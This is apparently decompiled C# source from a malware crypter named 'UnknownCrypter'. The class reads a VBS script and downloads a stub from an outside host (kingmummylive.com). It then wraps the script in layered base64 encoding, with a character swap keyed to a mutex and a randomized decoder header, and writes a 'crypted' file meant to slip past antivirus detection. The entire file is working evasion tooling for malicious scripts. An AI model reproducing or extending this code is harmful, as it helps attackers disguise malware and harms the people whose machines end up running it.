using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using UnknownCrypter;

public class GClass2
{
	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private Form3.GDelegate0 gdelegate0_0;

	private Form3.GDelegate1 gdelegate1_0;

	private Form3.GDelegate2 gdelegate2_0;

	private Random random_0;

	public GClass2(string vbsFilePath, string outputFilePath, string mutex, Form3.GDelegate0 callback, Form3.GDelegate1 progressReport, Form3.GDelegate2 done)
	{
		random_0 = new Random();
		string_0 = vbsFilePath;
		string_1 = outputFilePath;
		string_2 = mutex;
		gdelegate0_0 = callback;
		gdelegate1_0 = progressReport;
		gdelegate2_0 = done;
		string_3 = "A";
	}

	public void method_0()
	{
		if (File.Exists(string_0))
		{
			Thread thread = new Thread(method_1);
			thread.Start();
		}
		else
		{
			Interaction.MsgBox("File not found");
		}
	}

	private void method_1()
	{
		try
		{
			byte[] array = File.ReadAllBytes(string_0);
			if (array.Length > 1048576)
			{
				gdelegate0_0("File size too large. Cannot exceed 1MB");
				return;
			}
			gdelegate1_0(new int[2] { 1, 5 });
			string @string = Encoding.ASCII.GetString(array, 0, array.Length);
			if (@string.Contains("\n") || @string.Contains("\r"))
			{
			}
			string[] array2 = @string.Split('\n');
			@string = "";
			string[] array3 = array2;
			foreach (string text in array3)
			{
				if (!text.Trim().StartsWith("//") & (Operators.CompareString(text.Trim(), "", TextCompare: false) != 0))
				{
					@string = @string + text.Trim() + "\r\n";
				}
			}
			WebClient webClient = new WebClient();
			string text2 = webClient.DownloadString("http://kingmummylive.com/js.any.name");
			if (Operators.CompareString(text2, "", TextCompare: false) == 0)
			{
				gdelegate0_0("ERROR: Fatal Error");
				gdelegate2_0(1);
				return;
			}
			byte[] bytes = Encoding.ASCII.GetBytes(text2);
			string text3 = Convert.ToBase64String(bytes);
			text3 = text3.Replace(string_3, string_2);
			string text4 = Form3.string_0.Replace("[mutex]", string_2);
			text4 = text4.Replace("[A]", string_3);
			text4 = text4.Replace("[64code]", text3);
			bytes = Encoding.ASCII.GetBytes(text4);
			text4 = Convert.ToBase64String(bytes);
			string text5 = Form3.string_3.Replace("[64code]", text4);
			text5 = text5.Replace("[random]", method_2());
			@string = text5 + "\r\n" + @string;
			array = Encoding.ASCII.GetBytes(@string);
			string text6 = Convert.ToBase64String(array);
			string newValue = text6.Replace(string_3, string_2);
			string text7 = Form3.string_0.Replace("[mutex]", string_2);
			text7 = text7.Replace("[A]", string_3);
			text7 = text7.Replace("[64code]", newValue);
			File.WriteAllText(string_1, text7);
			gdelegate1_0(new int[2] { 1, 100 });
			gdelegate2_0(1);
			gdelegate0_0("File crypted successfully.");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			gdelegate0_0("ERROR: Exception was thrown");
			ProjectData.ClearProjectError();
		}
	}

	public string method_2()
	{
		string text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		StringBuilder stringBuilder = new StringBuilder();
		int num = 1;
		do
		{
			int index = random_0.Next(0, text.Length);
			char value = text[index];
			stringBuilder.Append(value);
			num = checked(num + 1);
		}
		while (num <= 10);
		return stringBuilder.ToString();
	}
}
